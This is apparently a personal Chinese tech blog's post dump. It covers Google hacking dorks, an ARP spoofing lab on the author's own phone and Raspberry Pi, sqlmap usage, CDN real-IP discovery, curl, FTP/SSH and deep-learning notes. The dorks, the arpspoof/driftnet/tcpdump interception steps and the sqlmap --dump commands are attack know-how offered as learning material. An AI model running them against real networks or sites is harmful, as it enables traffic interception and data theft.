逻辑与，用于查找同时包含A和B的内容 A or B 逻辑或，用于查找包含A或包含B或同时包含A和B的内容 A -B 逻辑非，用于查找A但不包含B的内容 “xxx yyy” 完整匹配，用于查找带有完整xxx yyy的内容 site:xxx.com yyy 指定搜索范围，用于搜索特定范围（xxx.com）内有关yyy的内容 filetype:txt xxx 指定搜索文件类型，用于搜索有关xxx的txt文件 inurl:aaa 搜索匹配网址中带aaa的内容 allinurl: aaa bbb 与inurl相似，只不过可以指定多个关键词 intext:aaa xxx 搜索匹配网页正文中带aaa的且有关xxx的内容 intitle:xxx 搜索匹配网页的标题中包含xxx的内容 xxx* 使用通配符*搜索有关以xxx为前缀的内容 link:xxx.com 返回所有指向xxx.com的网页 related:xxx.com 返回所有与xxx.com相似的网页（指布局相似） cache:xxx.com [yyy] 返回搜索引擎有关xxx.com的缓存，如果加上关键词，则网页中的关键词会被高亮 info:www.xxx.com 返回有关站点www.xxx.com的相关信息 define:xxx 返回有关xxx的定义 Index of /xxx 返回允许当作目录访问的网页 一些技巧：查找网站后台site:xx.com intext:管理 site:xx.com inurl:login site:xx.com intitle:后台 查看服务器使用的程序site:xx.com filetype:asp site:xx.com filetype:php site:xx.com filetype:jsp site:xx.com filetype:aspx 查看上传漏洞site:xx.com inurl:file site:xx.com inurl:load 查看可访问目录index of /admin index of /passwd index of /password index of /mail “index of /“ +passwd “index of /“ +password.txt “index of /“ +.htaccess “index of /root” “index of /cgi-bin” “index of /logs” “index of /config” quoteGoogle-Hacking 语法笔记_Simon_Smith的博客-CSDN博客 2-信息收集—Google hacking_songly_的博客-CSDN博客 信息收集之Google Hacking的简单用法_谢公子的博客-CSDN博客_google hacking Google Hacking使用详解_Teacher.Hu的博客-CSDN博客_google hacking","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"arp欺骗初次尝试","slug":"arp_cheat","date":"2022-04-03T12:21:02.410Z","updated":"2024-11-09T19:31:33.225Z","comments":true,"path":"2022/04/03/arp_cheat/","link":"","permalink":"http://uniqueland.top/2022/04/03/arp_cheat/","excerpt":"","text":"ARP欺骗是什么ARP欺骗（ARP spoofing），又称ARP毒化（ARP poisoning，网络上多译为ARP病毒）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网络上特定计算机或所有计算机无法正常连线。 以上来自百度百科 个人理解大概原理就是在每台用于上网的机器中都会有一张叫arp缓存表的东西，里边记录了ip地址与mac地址（物理地址）的映射关系 这张表的形成过程如下： 假设现在我要与ip地址为192.168.1.2的主机通信，我就向局域网内的所有主机广播消息“谁是192.168.1.2 ？”，这时如果该ip的主机收到了广播，就会向发出广播的主机回应“192.168.1.2是我，我的mac地址是xxx”，然后发出广播的主机就将该ip和该mac地址记录到本机的arp缓存表中 而arp欺骗要做的，就是假装自己是某一台被请求的主机，把自己的mac地址与被假装主机的ip绑定起来记录在别人的arp缓存表中；由于网络的实际传输是通过mac地址进行寻址的，这样所有发送到被假装主机的信息都会通过mac地址发送到恶意主机上 具体过程设备：手机一台，电脑一台，树莓派一个 说明： 手机充当受害者（ip：192.168.137.116） 电脑充当网关（开热点 ip：192.168.137.1） 树莓派作为攻击机器（ip：192.168.137.66） 使用程序：arpspoof(需要安装dsniff与ssldump)，tcpdump，driftnet 为什么需要树莓派？ 本来打算用vmware模拟所有的主机的，但是由于局域网的配置问题无法用vmware模拟所有机器，模拟一部分的话又会因为局域网的问题导致虚拟机与物理机无法进行正常通信，所以就拿出了我吃灰多年的原生树莓派 首先使用nmap扫描受害者 确定了受害者的ip之后使用命令 arpspoof -i [网卡（此处为wlan0）] -t [目标ip] [网关ip] 进行欺骗 1sudo arpspoof -i wlan0 -t 192.168.137.116 192.168.137.1 如果仅仅只是想对目标主机进行断网操作的话无需其他操作，但是如果想进行双向的欺骗（中间人攻击），就必须打开树莓派的转发功能，命令如下： 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 然后再打开另一个窗口，安装driftnet 12sudo apt install driftnetsudo driftnet -i [监听网卡] -a -d [截取的图片的存放目录] 这样就可以获取受害者此时的图片了 如果用树莓派查看图片不方便，可以打开80端口，把图片放到网站根目录下再从浏览器访问 实际上在我进行实验时，截图获取得并不是很顺利，所以我选择了另外一种获取通信信息的方式——tcpdump 在arpspoof命令运行的时候，由于受害者与网关的所有通信都会经过攻击机的网卡，故我们可以用tcpdump来获取本地网卡接收到的信息。命令如下： 1sudo tcpdump -i wlan0 -s 0 -w e.cap wlan0是网卡，e.cap是抓包存放的文件名称，回车之后便开始抓包，等到什么时候觉得差不多了就crtl+C停止就行，此时在当前目录下应该会出现刚刚抓包的文件（此处为e.cap），可以使用以下命令读取： 1sudo tcpdump -A -r e.cap -A是以ascii形式显示 -r后面的是要打开的文件，除了这种打开方式，还有类似过滤器的功能 1sudo tcpdump -n dst host 119.91.135.95 -r e.cap 该命令过滤了ip为119.91.135.95的通信信息并显示在屏幕上 以上是传输过程中截取的信息 quoteARP欺骗_百度百科 (baidu.com) kaili linux使用arpspoof进行arp欺骗 - 闻所未闻 - 博客园 (cnblogs.com) ARP–利用arpspoof和driftnet工具进行arp欺骗_mr_xiuk的博客-CSDN博客_arpspoof kali linux操作系统中TCPDUMP详细使用方法_隔壁老湿的技术博客_51CTO博客 Kali渗透-ARP断网攻击与监听_Tr0e的博客-CSDN博客_kali局域网渗透监控 kali linux下的arp攻击 - 逗比大师 - 博客园 (cnblogs.com)","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"Sqlmap基本操作","slug":"sqlmap","date":"2022-03-29T02:24:19.004Z","updated":"2024-11-09T19:31:57.605Z","comments":true,"path":"2022/03/29/sqlmap/","link":"","permalink":"http://uniqueland.top/2022/03/29/sqlmap/","excerpt":"","text":"安装Linux / Mac OS1git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev Windows安装git-bash之后在选定目录下右键打开git-bash窗口运行上述命令即可 下载地址： https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe 常用命令1234567python sqlmap.py -h # 获取常见选项python sqlmap.py -hh # 获取所有选项python sqlmap.py -u www.example.com # 检测GET注入python sqlmap.py -u www.example.com --batch # 使用默认选项（不用手动选择y/n）python sqlmap.py -u www.example.com --batch --dbs --tables --columns # 返回数据库/表/列python sqlmap.py -u www.example.com --batch -D xxx -T xxx -C xxx # 指定数据库/表/列python sqlmap.py -u www.example.com --batch --dump # 直接返回数据库内容 注：如果是在Linux系统下，python命令可能调用的是python2，如果报错可将python换为python3 ​ 如果有其他报错，尝试将网址等参数用双引号包裹 ​ Windows下可在命令提示符或powershell下运行 在返回数据库/表/列时，可只指定一项 在指定数据库/表/列时，也可只指定一项 一般将dump选项和上述命令结合，直接返回注入结果 更多玩法12345678910python sqlmap.py -m 1.txt # 从文件中导入urlpython sqlmap.py -r res.txt # 从文件中导入http响应python sqlmap.py -l burp.txt # 从文件中导入burp抓包文件python sqlmap.py -u www.example.com --data=&quot;id=1&quot; # 使用POST注入python sqlmap.py -u www.example.com --level 2 # 使用2级注入，检测cookie注入python sqlmap.py -u www.example.com --level 3 # 使用3级注入，检测referer注入和USER-AGENT注入python sqlmap.py -u www.example.com --level 5 # 使用5级注入，检测host注入python sqlmap.py -u www.example.com --random-agent # 使用随机代理python sqlmap.py -u www.example.com --tor # 使用匿名tor网络python sqlmap.py -u www.example.com --hpp # 检测http污染 level默认为1，范围为 1 - 5 更多用法和命令可参照官网文档：http://sqlmap.org/ quoteGitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool sqlmap详细使用教程_星落.的博客-CSDN博客_sqlmap 超详细SQLMap使用攻略及技巧分享 - FreeBuf网络安全行业门户","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"有关BT种子的一些事","slug":"bit_torrent","date":"2022-03-27T11:51:10.696Z","updated":"2024-11-09T19:33:03.709Z","comments":true,"path":"2022/03/27/bit_torrent/","link":"","permalink":"http://uniqueland.top/2022/03/27/bit_torrent/","excerpt":"","text":"Bit Torrent (BT种子)是什么？ BitTorrent(简称BT)是一个文件分发协议，每个下载者在下载的同时不断向其他下载者上传已下载的数据。而在FTP,HTTP协议中，每个下载者在下载自己所需文件的同时，各个下载者之间没有交互。当非常多的用户同时访问和下载服务器上的文件时，由于FTP服务器处理能力和带宽的限制，下载速度会急剧下降，有的用户可能访问不了服务器。BT协议与FTP协议不同，特点是下载的人越多，下载速度越快，原因在于每个下载者将已下载的数据提供给其他下载者下载，充分利用了用户的上载带宽。通过一定的策略保证上传速度越快，下载速度也越快。在很短时间内，BitTorrent协议成为一种新的变革技术。 以上说明来自百度百科 用通俗的话讲，BT种子（以下简称 种子 ）技术其实就是将一个比较大的文件（比如电影或镜像）按照一定的规范分成多个块，当用户通过.torrent文件下载时，会连接上种子文件中记录的tracker服务器，而tracker服务器并不提供文件本身，而是通过查询返回当前同在下载该文件的其他客户端的地址，而主机接收到该地址后，会逐个逐个尝试连接，连接成功的便通过点对点（P2P）的方式获取对方计算机上的另一部分文件，然后再连接其他的客户端，获取文件的其他部分 Bit Torrent 与其他下载方式相比，有什么优势？不同于传统的 C/S ( Client / Server )模式，P2P的下载方式避免了单个服务器提供多个客户端的服务时带宽负载大的问题；在P2P下载时，每一台计算机，既是客户端，又是服务端，在下载的过程中，也向其他有需要的客户端上传自己的文件，有效节省了带宽； 另外，由于P2P去中心化的特点，每个处于BT网络中的文件，其存在与否不再取决于文件的提供者或服务商，在一定程度上避免了文件因个人过失而永久消失的情况 Bit Torrent 与其他下载方式相比，有什么劣势？有优势就肯定有劣势，如上文所说，BT下载是通过同在下载该文件的其他客户端提供的服务来获取文件的，那么，当同时在下载该文件的客户端很少，甚至我们可以假设一种极端情况：整个网络就只有你一台计算机在下载该文件，那么你将不会得到你想要的文件，因为没有其他节点给你提供你想要的文件 另一方面，同样由于BT技术中文件无法轻易清除的特点，文件一旦上传，想永久抹去的可能性不大，那么万一有不法分子上传了本不该出现在网络上的文件（比如有关国家机密或者个人隐私，有或者未上映的电影之类的），其后果不堪设想 torrent文件都记录了什么？A）这个文件（文件夹）中数据的SHA1值，比如一个1G的文件，如果按1M每块进行分块，则会被分为了1000块，torrent中就会有这1000个数据块的指纹值（SHA1的hash值），这个占据了torrent文件的绝大部分空间。这些值的目的是为了下载的过程中进行数据校验，确保数据收到的和当时源头制作torrent时的源文件100%一致，防止恶意数据攻击。 B）一般制作torrent文件时，还会要指定一个或者多个Tracker的地址，比如http://www.a.com:8080/announce这种地址。torrent里面一般也会存储了这个信息，这个其实也尤为重要。相当于记录了一个问询服务器的地址，这个问询服务器的作用，后面我再解释。 C）文件或者文件夹内每个文件的名字，方便下载文件时，磁盘上直接命名好跟原始数据一样的目录结构、文件名。 D）其它一些辅助和可扩展的信息，比如可以配置一个P2SP的http地址辅助下载，比如制作软件的名字、备注……。 E）上面信息生成后，torrent会把A）里面的这些信息，以及torrent里面的文件名等关键信息，再进行一次Hash，生成一个新的SHA1值，作为torrent的HASH值，也就是我们经常看到的下载软件里面对这个种子命名的一个唯一的hash值，也有的在magnet这种磁力链接中可以看到这个值，这就是torrent的唯一标记。 以上就是.torrent文件的内容，可以用记事本打开，但可能看到乱码。这个文件的编码遵循了bencode编码规则。但实际内容就主要是上面这些。所以，torrent可以理解为对原始数据的一些记录。 如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？不一定，BT发明者提出了DHT（Distributed Hash Table）的概念，就算Tracker连不上了，也可以通过分布式哈希表DHT技术，通过DHT网络慢慢的寻找志同道合的邻居节点，只是没有Tracker那么直接那么快速，但慢一些总还是有机会找到邻居的 有关下载过程中的一些事文件下载时，若存在提供下载服务的http服务器，那么就算没有其他的客户端在线，下载仍然可以进行 下载过程中出现卡在99.99%的原因是因为当所有分块都下载完毕时，电脑会对下载的文件进行文件校验（类似于哈希检验），而当文件校验不通过时，电脑就会对组成文件的所有分块逐个逐个进行检验，发现校验值不对的文件分块再重新下载，这就是为什么有时候下载卡住的原因 当文件下载完毕时，如果你没有关闭下载文件的客户端，那么如果有其他人需要你的文件，即使你没有在下载文件，你所拥有的文件分块依然可以上传给其他客户端，成为一名崇高的传递者 文件下载时，影响下载速度的，除了你的电脑当前的网速，其实还有你的电脑当前的上传速度；在BT网络的带宽分配中，上传速度快的客户端能够获得的下载速度会相对比较快 某些运营商会对BT下载时的通信进行拦截，它们会对通信过程中传输的内容进行分析，由于早期的下载传输的是明文，故很容易就能够被运营商截取；当然，道高一尺，魔高一丈，如今的下载过程传输的内容大部分都进行过加密 quoteBitTorrent_百度百科 (baidu.com) https://www.zhihu.com/question/49829233/answer/160765176","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"有关cdn和真实ip的一些事","slug":"cdn","date":"2022-03-20T06:21:18.883Z","updated":"2024-11-09T19:33:26.863Z","comments":true,"path":"2022/03/20/cdn/","link":"","permalink":"http://uniqueland.top/2022/03/20/cdn/","excerpt":"","text":"CDN是什么？ CDN(Content Delivery Network)是指内容分发网络，也称为内容传送网络，这个概念始于1996年，是美国麻省理工学院的一个研究小组为改善互联网的服务质量而提出的。为了能在传统IP网上发布丰富的宽带媒体内容，他们提出在现有互联网基础上建立一个内容分发平台专门为网站提供服务，并于1999年成立了专门的CDN服务公司，为Yahoo提供专业服务。由于CDN是为加快网络访问速度而被优化的网络覆盖层，因此被形象地称为“网络加速器”。 以上是来自百度百科的解释个人理解，通俗点说，cdn其实就是一些服务器，将你的一些静态文件（html）什么的复制一份，然后等有人访问网站的时候再就近选择cdn服务器把你的那些静态页面返回，这样就不用通过你的服务器，从而减轻带宽负载了 CDN和IP是什么关系？由于用户获取静态文件时大概率会由CDN服务器返回，则大多数情况下用户输入域名访问网站时，实际进行通信的很可能不是该网站真实的IP，而是CDN服务器的IP CDN的好处有哪些？最明显的也是大部分人最需要的，就是减少自家服务器的带宽负载此外还有一个好处，就是隐藏服务器的真实IP（但是不能百分百隐藏） CDN隐藏IP的好处是什么？为什么不能完全隐藏？隐藏IP最大的好处就是在一定程度上避免自家服务器受到攻击（DDoS攻击之类的），因为不法分子无法知道我们服务器的真实IP，也就无法对该IP进行大量重复的请求从而达到使网站拒绝服务的效果，最多就是把最近的CDN服务器打了下来那天下CDN千千万，你把这个打下来了又有什么用呢？你又不能确保你下一个访问的服务器一定不是CDN 我怎么知道自己的请求是不是到了CDN呢？想知道自己访问的服务器是不是CDN，有几种办法：windows命令行用nslookup命令查询一下目标域名，如果一个域名对应着好几个IP，那十有八九是使用了CDN；当然，如果只返回了一个IP也不能说明目标网站就没有使用CDN在CDN查询网站上查 http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/ 查子域名：因为大部分站长使用CDN针对的大多是首页等访问量比较大的页面，那么子页面就有可能没有使用CDN，这时候查询子页面返回的结果很有可能就是真实IP漏洞利用：用CTF那套试试。不过不提倡且大部分情况下不合法分析服务器返回的信息：有些网站会有邮件服务或者订阅服务之类的，而这些服务有时并不会使用CDN，通过分析邮件源码就可以得到IP通过国外访问：有些CDN只面向国内的请求，对于不在服务范围的国外请求有可能不会经过CDN而直接访问真实IP直接访问CDN服务器：最直接的方法就是拿到CDN服务器的账户自己上去查 怎样才能有CDN服务？除了花钱买这一最直接的方法之外，还有另外一种能够获得CDN服务的方法，就是在租赁域名的时候很多服务提供商会免费对该域名提供CDN服务，不要白不要 以下是对我自己网站的CDN查询 最后再说一句，拿到真实IP了也未必能够通过IP访问目标网站 quotehttps://blog.csdn.net/fly_hps/article/details/98486807https://www.cxybb.com/article/weixin_37104668/115167764https://baike.baidu.com/item/CDN/420951","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"curl的常见用法","slug":"curl","date":"2022-03-12T12:22:27.696Z","updated":"2022-03-12T12:52:54.139Z","comments":true,"path":"2022/03/12/curl/","link":"","permalink":"http://uniqueland.top/2022/03/12/curl/","excerpt":"curl用法：","text":"curl用法： 123456789101112131415161718192021222324252627282930313233343536373839GET请求：curl https://www.xxx.comPOST请求：curl -d key=value https://www.xxx.com填写表单：curl -F key1=value1 -F key2=value2 https://www.xxx.com/xxx.cgi显示信息：curl -i https://www.xxx.com指定USER-AGENTcurl -A &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39&quot; https://www.xxx.com注：若留空则移除User-Agent标头跟随重定向：curl -L https://www.xxx.com注：curl默认不跟随重定向发送cookie：curl -b &quot;foo=bar&quot; https://www.xxx.comurl编码：curl --data-urlencode &quot;xxxxxxx&quot; https://www.xxx.com注：该方式与-d相近，区别在于是否编码保存网页(与wget相似)：curl -o xxx.html https://www.xxx.com用户认证：curl -u &quot;user:passwd&quot; https://www.xxx.com/login输出通信过程：curl -v https://www.xxx.com输出二进制数据：curl --trace - https://www.xxx.com注：可配合-o导出 quotehttps://www.jianshu.com/p/fc0eb6c60816https://www.ruanyifeng.com/blog/2019/09/curl-reference.html","categories":[],"tags":[{"name":"tool","slug":"tool","permalink":"http://uniqueland.top/tags/tool/"}]},{"title":"ftp,sftp与ssh之间的关系","slug":"ftp_sftp_ssh","date":"2022-03-06T03:27:06.551Z","updated":"2022-03-06T05:24:37.416Z","comments":true,"path":"2022/03/06/ftp_sftp_ssh/","link":"","permalink":"http://uniqueland.top/2022/03/06/ftp_sftp_ssh/","excerpt":"ftp和sftp的区别这两种协议都是用于传输文件的，其中sftp是基于ssh的原理","text":"ftp和sftp的区别这两种协议都是用于传输文件的，其中sftp是基于ssh的原理开发的 ftp: File Transfer Protocolstfp: Secure File Transfer Protocol / SSH File Transfer Protocolssh: Secure Shell ftpftp是明文传输，有两种模式：主动模式和被动模式 主动模式(Positive Mode)：在该模式下，服务端开放21，20端口；21端口用于接收用户名和密码，20端口用于传输数据客户端登录ftp服务器后随机开放一个端口，再将这个端口的信息发送给服务端，服务端再通过用于传输数据的20端口连接至用户提供的端口 被动模式(Passive Mode)：在该模式下，服务端开放用于客户端连接的21端口以及一个随机端口，而客户端在登录ftp服务器后接收服务端提供的随机端口的信息，再连接至服务端的该端口以传输数据 stfp 首先要明确的一点是，stfp是ssh的一个子服务 sftp是基于ssh的技术进行文件的传输的，而ssh是通过22端口进行通信的，也就是说sftp也是通过22端口进行通信以及数据传输的，与ftp协议相比，除了通信端口的不同，由于ssh的通信过程是加密的，所以sftp中文件的传输也是加密的，但实际的安全性还取决于ssh的连接方式；且在ssh服务器与通信主机（服务器）分开时还分有半安全模式(Less Secure Connection)和安全模式(Full Secure Connection) 半安全模式指用户通过ssh连接ssh服务器时所有的数据都是加密的，而ssh服务器与主机间通信的数据是未加密的 安全模式指用户与ssh服务器以及ssh服务器与主机间的通信都是加密的 而当ssh服务运行于目标主机上时便不存在半安全模式和安全模式之分了 ssh作为远程连接主机的常用方式，ssh有两种连接方式，一种是通过用户名和密码进行通信，这种方式非常方便，只需要任意一台能够接入互联网的常用设备就能够连接上远程主机，但是这种方式存在受到中间人攻击的可能；另一种方式是通过密钥分发的方式，即在服务端生成一份私钥存于服务器，再生成一份公钥分发给需要通信的主机，这种方式不需要用户名和密码，并且通信时需要进行密钥与公钥的验证，基本杜绝了中间人攻击的可能，但是由于需要提前准备好公钥，故便携性不如第一种方式 quotehttps://network.51cto.com/article/603552.htmlhttps://www.zhihu.com/question/20402010https://blog.csdn.net/cuker919/article/details/6403925","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"Deep Learning from Scratch 5","slug":"deep_learning_from_scratch_5","date":"2021-12-25T08:05:51.980Z","updated":"2021-12-25T08:44:21.959Z","comments":true,"path":"2021/12/25/deep_learning_from_scratch_5/","link":"","permalink":"http://uniqueland.top/2021/12/25/deep_learning_from_scratch_5/","excerpt":"深度学习应用案例","text":"深度学习应用案例 物体检测 – R-CNN 图像分割 – FCN 图像标题的生成 – NIC (CNN+RNN) 图像风格变换 图像的生成 – DCGAN 自动驾驶 Dep Q-Network (强化学习) 多模态处理 组合图像和自然语言等多种信息进行的处理 GAN 生成式对抗网络（GAN, Generative Adversarial Networks ）是一种深度学习模型，是近年来复杂分布上无监督学习最具前景的方法之一。模型通过框架中（至少）两个模块：生成模型（Generative Model）和判别模型（Discriminative Model）的互相博弈学习产生相当好的输出。原始 GAN 理论中，并不要求 G 和 D 都是神经网络，只需要是能拟合相应生成和判别的函数即可。但实用中一般均使用深度神经网络作为 G 和 D 。 –Baidu Baike","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"Deep Learning from Scratch 4","slug":"deep_learning_from_scratch_4","date":"2021-12-18T13:14:56.550Z","updated":"2021-12-19T03:18:49.592Z","comments":true,"path":"2021/12/18/deep_learning_from_scratch_4/","link":"","permalink":"http://uniqueland.top/2021/12/18/deep_learning_from_scratch_4/","excerpt":"卷积神经网络与普通机器学习的区别","text":"卷积神经网络与普通机器学习的区别 CNN中新出现了卷积层和池化层 全连接层存在的问题在全连接层中，传入的图像的形状信息被破坏了；由于在全连接层中，数据是以一维的形式传入的，故忽略了图像中诸如相邻像素之间的关系 特征图卷积层的输入输出数据。根据输入和输出分为输入特征图和输出特征图 卷积运算卷积运算是以一定的间隔滑动滤波器的窗口并对输入数据应用滤波器，应用的方式有乘积累加，偏置和求和等 填充向输入数据的周围填入固定的数值；“幅度为1的填充”指的是向输入数据周围1个单位的范围内填充0 作用：调整输出的大小，由于在卷积运算中空间不断缩小，为了在保持输出大小不变的前提下进行卷积运算甚至深度卷积，就需要填充来调整数据空间大小 步幅 应用滤波器的位置间隔 3维数据的卷积运算与2维数据的卷积运算不同的是，3维数据的卷积运算同时进行多通道的卷积并将结果相加 池化层池化是缩小高、长方向上的空间的运算；包含Max池化和Average池化等 特征 没有要学习的参数 通道数不发生变化 对微小的位置变化具有鲁棒性（健壮） 具有代表性的CNN LeNet 是进行手写数字识别的网络，具有连续的卷积层和池化层，最后经全连接层输出结果 不同点 激活函数不同 LeNet使用sigmoid函数，而现在的CNN主要使用ReLU函数 在缩小中间数据的大小时采用的方法不同 原始的LeNet中使用子采样(subsampling)，而现在的CNN大多使用Max池化 AlexNet 在结构上与LeNet基本没有什么不同 与LeNet的差异 激活函数使用ReLU 使用进行局部正规化的LRN(Local Response Normalization)层 使用Dropout Data Augmentation(数据扩充)基于算法“人为地”扩充输入图像（训练图像），如施加旋转、垂直或水平方向上的移动等微小变化，以此增加图像的数量 加深层的好处 减少网络的参数数量 与没有加深层的网络相比，加深了层的网络可以用更少的参数达到同等水平（或者更强）的表现力 使学习更加高效 随着层的加深，神经元会对更复杂的东西有响应 可以分层次地分解需要学习的问题 可以分层次地传递信息 感受野(receptive field)给神经元施加变化的某个局部空间区域 ImageNet一个拥有超过100万张图像的数据集 在深度学习中比较知名的网络 VGG GoogLeNet ResNet 深度学习中高速化的问题在深度学习中大部分时间都耗费在卷积层上 基于GPU的高速化深度学习中需要进行大量的乘积累加计算，而这正是GPU所擅长的，故可使用GPU来进行深度学习的运算以提高学习速度 分布式学习为了进一步提高深度学习所需的计算的速度，可以考虑在多个GPU或者多台机器上进行分布式计算","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"ftp文件服务器搭建","slug":"ftp_server","date":"2021-12-16T15:03:06.120Z","updated":"2021-12-16T15:15:51.555Z","comments":true,"path":"2021/12/16/ftp_server/","link":"","permalink":"http://uniqueland.top/2021/12/16/ftp_server/","excerpt":"第一步：更新软件列表","text":"第一步：更新软件列表 1234567891011121314zh@ubuntu:~$ sudo apt update[sudo] password for zh: Hit:1 http://cn.archive.ubuntu.com/ubuntu focal InReleaseGet:2 http://cn.archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]Get:3 http://cn.archive.ubuntu.com/ubuntu focal-backports InRelease [108 kB]Get:4 http://cn.archive.ubuntu.com/ubuntu focal-security InRelease [114 kB]Get:5 http://cn.archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1,397 kB]Get:6 http://cn.archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [883 kB] Fetched 2,615 kB in 10s (271 kB/s) Reading package lists... DoneBuilding dependency tree Reading state information... Done49 packages can be upgraded. Run &#x27;apt list --upgradable&#x27; to see them. 第二步：安装vsftpd1234567891011121314151617181920212223242526272829303132zh@ubuntu:~$ sudo apt install vsftpdReading package lists... DoneBuilding dependency tree Reading state information... DoneThe following additional packages will be installed: ssl-certSuggested packages: openssl-blacklistThe following NEW packages will be installed: ssl-cert vsftpd0 upgraded, 2 newly installed, 0 to remove and 49 not upgraded.Need to get 132 kB of archives.After this operation, 402 kB of additional disk space will be used.Do you want to continue? [Y/n] yGet:1 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 ssl-cert all 1.0.39 [17.0 kB]Get:2 http://cn.archive.ubuntu.com/ubuntu focal/main amd64 vsftpd amd64 3.0.3-12 [115 kB]Fetched 132 kB in 3s (50.0 kB/s) Preconfiguring packages ...Selecting previously unselected package ssl-cert.(Reading database ... 71512 files and directories currently installed.)Preparing to unpack .../ssl-cert_1.0.39_all.deb ...Unpacking ssl-cert (1.0.39) Selecting previously unselected package vsftpd..............................................................................] Preparing to unpack .../vsftpd_3.0.3-12_amd64.deb ...Unpacking vsftpd (3.0.3-12) ...######################.......................................................................] Setting up ssl-cert (1.0.39) ...#################################...........................................................] Progress: [ 56%] [##########################################################................................................] Setting up vsftpd (3.0.3-12) ...########################################################....................................] Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /lib/systemd/system/vsftpd.service.............] Processing triggers for man-db (2.9.1-1) Processing triggers for systemd (245.4-4ubuntu3.11) ... 第三步：添加用户123456zh@ubuntu:~$ sudo nano /etc/vsftpd.confzh@ubuntu:~$ sudo useradd -m ftpuserzh@ubuntu:~$ sudo passwd ftpuserNew password: Retype new password: passwd: password updated successfully 第四步：测试1root@ubuntu:/home/zh# echo &quot;TEST&quot; &gt; ../ftpuser/test.txt","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://uniqueland.top/tags/linux/"}]},{"title":"Deep Learning from Scratch 3","slug":"deep_learning_from_scratch_3","date":"2021-12-11T08:29:42.485Z","updated":"2021-12-12T01:39:50.058Z","comments":true,"path":"2021/12/11/deep_learning_from_scratch_3/","link":"","permalink":"http://uniqueland.top/2021/12/11/deep_learning_from_scratch_3/","excerpt":"误差反向传播法","text":"误差反向传播法 Affine 层（仿射变换） 神经网络的正向传播中进行的矩阵的乘积运算在几何学领域被称为“仿射变换” ​ 注：在affine层的反向传播过程中要注意矩阵形状 梯度确认(gradient check) 确认数值微分求出的梯度结果和误差反向传播法求出的结果是否一致的操作 ​ 用于确认误差反向传播法的实现是否正确 与学习相关的技巧最优化 解决“寻找最优参数的问题”的过程 SGD $$W= W-η\\frac{\\partial L}{\\partial W}$$ 缺点 如果函数的形状非均向(anisotropic)，搜索的路径就会非常低效 抵消的根本原因：梯度的方向并没有指向最小值的方向 Momentum $$v=\\alpha v - \\eta \\frac{\\partial L}{\\partial W}$$ $$W=W+v$$ AdaGrad $$h=h+\\frac{\\partial L}{\\partial W} .\\frac{\\partial L}{\\partial W}$$ $$W=W-\\eta \\frac{1}{h^{\\frac{1}{2}}}\\frac{\\partial L}{\\partial W}$$ ​ AdaGrad会记录过去所有梯度的平方和。因此，学习越深入，更新的幅度就越小。实际上，如果无止境的学习，更新量就会变成零 Adam 融合了Momentum和AdaGrad方法。通过组合前面两个方法的优点，有望实现参数空间的高效搜索 特征：超参数的“偏置校正” 权重的初始值​ 将权重设置为0的问题 ​ 如果将权重设置为零，那么下一层的神经元会杯传递相同的值，从而达不到学习的效果（乘法反向传播的例子），则在反向传播时第二层的权重进行同样的更新，这使得神经网络拥有许多不同的权重的意义丧失了。即防止“权重均一化”（瓦解权重的对称结构） 梯度消失（梯度爆炸）在运用链式法则时，由于运算时以连乘的形式进行，所以当层数很深时，随着层数的增加，计算出的梯度会指数级变化，如果是往小了变，就出现了梯度消失现象，如果是往大了变，就出现了梯度爆炸现象 表现力受限当传递给神经元的是有所偏向的数据时，有可能会出现表现力受限的问题，即多个神经元输出相同的结果，那同样可以由一个神经元完成的事情无疑令这些神经元的存在变得无意义 Xavier初始值 如果前一层的节点数为n，则初始值使用标准差为1/(n^(1/2))的分布 ReLU的权重初始值 当激活函数使用ReLU时，一般推荐使用ReLU专用的初始值，也称为“He初始值” He初始值使用标准差为(2/n)^(1/2)的高斯分布 Batch Nomalization (Batch Norm) 以进行学习时的mini-batch为单位，按mini-batch进行正规化 进行使数据分布的均值为0，方差为1的正规化$$\\mu B=\\frac{1}{m}\\Sigma^m{i=1}x_i$$ $$\\sigma ^2_B=\\frac{1}{m}\\Sigma^m_{i=1}(x_i-\\mu_B)^2$$ $$x_i=\\frac{x_i-\\mu_B}{\\sqrt{\\sigma_B^2+\\epsilon}}$$ 优点： 可以使学习快速进行（可以增大学习率） 不那么依赖初始值（对于初始值不用那么神经质） 抑制过拟合（降低Dropou等的必要性） 